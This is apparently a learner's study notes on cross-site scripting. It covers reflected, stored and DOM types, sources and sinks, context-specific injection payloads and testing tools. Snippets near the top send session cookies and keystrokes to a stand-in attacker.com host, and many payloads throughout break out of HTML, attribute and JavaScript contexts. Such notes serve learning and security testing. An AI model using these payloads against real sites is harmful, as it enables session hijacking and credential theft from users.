# Cross-Site Scripting (XSS) : My Learnings

XSS is one of those vulnerabilities that sounds simple on paper but has a lot of depth once you start actually exploiting it. The core idea is straightforward: get a browser to execute JavaScript that you wrote, in a context you should not have control over. What makes it interesting is how many different ways that can happen depending on where your input lands.

---

## What is XSS

XSS happens when an application takes untrusted user input and includes it in a page in a way that the browser interprets as executable code rather than plain text. The browser does not know the difference between JavaScript that the developer intended and JavaScript that an attacker injected. If it is in the page and it looks like code, it runs.

The browser is the victim. The application is the vehicle. The user visiting the page is the target.

---

## What Can You Actually Do With XSS

Alert boxes in labs are just proof of concept. In a real scenario:

**Session hijacking** : steal the victim's session cookie and use it to log in as them:
```javascript
fetch('https://attacker.com/?cookie=' + document.cookie)
```

**Credential harvesting** : inject a fake login form into the page and capture what the user types.

**Keylogging** : attach event listeners to capture every keystroke:
```javascript
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/?key=' + e.key);
});
```

**Redirecting users** : send the victim to a phishing page:
```javascript
window.location = 'https://evil.com';
```

**Defacement** : modify the visible content of the page.

**CSRF with XSS** : use the victim's browser to make authenticated requests to the application on their behalf.

**Bypassing CSRF tokens** : read the CSRF token from the DOM and include it in a forged request, which is something a regular CSRF attack cannot do.

XSS essentially gives you a remote code execution primitive inside the victim's browser, scoped to the origin of the vulnerable site.

---

## Types of XSS

### Reflected XSS

The payload lives in the HTTP request (usually in a URL parameter). The server takes it, puts it directly into the response HTML, and sends it back. It fires once, immediately, for whoever made that request.

To exploit this against someone else you have to get them to click a crafted link.

```
https://vulnerable.com/search?q=<script>alert(1)</script>
```

The server reflects your search term into the page without encoding it, the script runs.

### Stored XSS

The payload gets saved to the database. Every time any user views that page, the payload is fetched and injected into the HTML. You do not need to deliver a link. Anyone who visits the page naturally gets hit.

Comments, usernames, profile bios, product reviews, any user-supplied content that gets stored and rendered is a potential stored XSS surface. It is considered more severe than reflected because of the passive delivery.

### DOM Based XSS

No server involvement. The vulnerability is entirely in client-side JavaScript. The page reads data from a source (usually `location.search`, `location.hash`, or `document.referrer`) and writes it into the DOM using a dangerous method. The server never sees the payload in a way that could filter it.

This is why some WAFs miss DOM XSS entirely. The payload never travels through the server response in an obvious way.

---

## Sources and Sinks

DOM XSS has a specific vocabulary worth knowing.

**Source** = where attacker-controlled data enters the client-side JavaScript.

Common sources:
```
location.search       URL query string (?param=value)
location.hash         URL fragment (#value)
location.href         full URL
document.referrer     referring page URL
document.cookie       cookie values
localStorage / sessionStorage
```

**Sink** = where the data ends up in a way that can cause execution.

Common sinks:
```
document.write()
innerHTML
outerHTML
eval()
setTimeout() / setInterval()   if passed a string
element.src
element.href
jQuery $()
jQuery .attr('href', ...)
jQuery .html()
```

The vulnerability exists when data flows from a source to a sink without being sanitised in between.

---

## HTML Contexts and How to Escape Them

Where your input lands determines what technique you need. This is the most important thing to figure out before writing a payload.

### Raw HTML context

Your input lands directly in the page body. Nothing to break out of.

```html
<p>Hello, YOUR_INPUT_HERE</p>
```

Payload:
```html
<script>alert(1)</script>
```

or:
```html
<img src=1 onerror=alert(1)>
```

### HTML attribute context

Your input is inside an attribute value:

```html
<input value="YOUR_INPUT_HERE">
<img src="/tracker?q=YOUR_INPUT_HERE">
```

You need to close the attribute and the tag first before injecting:

```
" > <script>alert(1)</script>
"><svg onload=alert(1)>
```

What the HTML becomes:
```html
<img src="/tracker?q="><svg onload=alert(1)>">
```

The original tag closes early and your new element runs.

### href attribute context

Your input becomes a link URL:

```html
<a href="YOUR_INPUT_HERE">Back</a>
```

The `javascript:` protocol executes code when the link is clicked:

```
javascript:alert(document.cookie)
```

### innerHTML sink

You cannot use `<script>` here. The browser intentionally does not execute script tags inserted via `innerHTML`. Use event-based payloads instead:

```html
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<body onresize=alert(1)>
```

### JavaScript string context

Your input lands inside a JavaScript string inside a script block:

```html
<script>
    var query = 'YOUR_INPUT_HERE';
</script>
```

Break out of the string:

```
'; alert(1); //
```

The `'` closes the string, `;` ends the statement, your code runs, `//` comments out whatever was after the original string.

---

## Sink Behaviour Reference

Not every sink executes everything. Knowing this saves time when a payload is not working.

| Sink | Executes `<script>` | Executes event handlers | Executes `javascript:` |
|---|---|---|---|
| `document.write` | Yes | Yes | Yes |
| `innerHTML` | No | Yes | No |
| `outerHTML` | No | Yes | No |
| `eval()` | Yes | Yes | Yes |
| `element.href` | No | No | Yes (on click) |
| `jQuery .html()` | No | Yes | No |
| `jQuery .attr('href')` | No | No | Yes (on click) |

---

## Delivery Methods

### Self-executing (no user interaction needed)

```html
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=1 onerror=alert(1)>
<body onload=alert(1)>
```

### Requires user interaction

```html
<a href="javascript:alert(1)">click me</a>
<input onfocus=alert(1) autofocus>
<select onchange=alert(1)><option>1</option></select>
```

For stored XSS in a real attack, self-executing payloads are preferred because they fire the moment the page loads without needing the victim to do anything.

---

## Tools and Testing Approach

**Manual testing first.** Enter `"'<>` into every input field and check where those characters appear in the page source. If `<` is not encoded to `&lt;` in the output, that is a potential injection point.

**Identify the context.** Right-click and inspect the element to see exactly where your input landed and what surrounds it.

**Choose the right payload for the context.** Use the context table above.

**Browser DevTools.** The console shows JavaScript errors. The Elements panel shows the live DOM. The Network tab shows what requests your payload triggered.

**Common tools:**
```
Burp Suite        intercept and modify requests, test payloads in Repeater
XSStrike          automated XSS scanner with context awareness
Dalfox            fast XSS scanner
```

---

## Quick Reference

| XSS Type | Payload lives | Who gets hit | Needs crafted link |
|---|---|---|---|
| Reflected | URL parameter | Only the requester | Yes |
| Stored | Database | All visitors | No |
| DOM Based | Client-side JS | Depends | Depends |

| Context | How to escape | Payload shape |
|---|---|---|
| Raw HTML | Nothing to escape | `<script>alert(1)</script>` |
| HTML attribute | Close attribute and tag | `"><svg onload=alert(1)>` |
| href attribute | javascript: protocol | `javascript:alert(1)` |
| innerHTML sink | Event handler element | `<img src=1 onerror=alert(1)>` |
| JS string | Close the string | `';alert(1);//` |

---
